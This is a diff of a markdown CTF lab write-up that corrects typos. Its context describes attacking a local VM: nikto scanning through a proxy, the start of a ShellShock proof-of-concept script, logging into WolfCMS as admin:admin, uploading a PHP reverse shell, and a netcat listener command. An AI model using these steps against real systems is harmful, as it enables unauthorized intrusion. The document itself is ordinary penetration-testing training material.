@@ -91,7 +91,7 @@ root@BOEING:~# nikto -h 192.168.159.131 -useproxy http://192.168.159.131:3128
 ---------------------------------------------------------------------------
 + 1 host(s) tested
 ```
-From Nikto's output I foun;d:
+From Nikto's output I found:
 * /robots.txt
 * /cgi-bin/status
 * /?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000
@@ -107,7 +107,7 @@ Befor testing, proxy on the system must be configured
 export http_proxy="http://p192.168.159.131:3128"
 ```
 
-This is my PoC script of ShellShock (find more information about shellshock[link](https://access.redhat.com/articles/1200223))
+This is my PoC script of ShellShock (find more information about [shellshock](https://access.redhat.com/articles/1200223))
 ```python
 import sys
 import httplib2
@@ -219,13 +219,14 @@ GENERATED WORDS: 4612
 END_TIME: Fri Mar  3 08:21:02 2017
 DOWNLOADED: 4612 - FOUND: 7
 ```
-dirb found 7 directory and 2 of them were enable directory listing but no one was interesting.
-I goolgled for admin page of wolfcms and found [this](https://www.wolfcms.org/forum/topic2034.html) quite useful. The discussion told me that there are 2 possible admin page **/admin** and **/?admin** depend on mod_rewrite was enable or not.
+dirb found 7 directories and 2 of them were enabled directory listing but no one was interesting.
+I goolgled for admin page of wolfcms and found [this](https://www.wolfcms.org/forum/topic2034.html) quite useful. The discussion told me that there are 2 possible admin pages **/admin** and **/?admin** depend on mod_rewrite was enable or not.
 I found http://192.168.159.131/wolfcms/?admin was accessible and for a couple of trying I successfully authenticate by using admin:admin.
 
 There was a page /wolfcms/?/admin/plugin/file_manager to manage file including upload shell.
 I used [this reverse shell](http://pentestmonkey.net/tools/web-shells/php-reverse-shell) from pentestmonkey to reverse shell to my listening netcat.
-When upload file had been completed. The file will be store in /wolfcms/public/
+When upload file had been completed. The file will be stored in /wolfcms/public/
+
 To listening reverse shell
 ```
 nc -v -n -l -p 1234
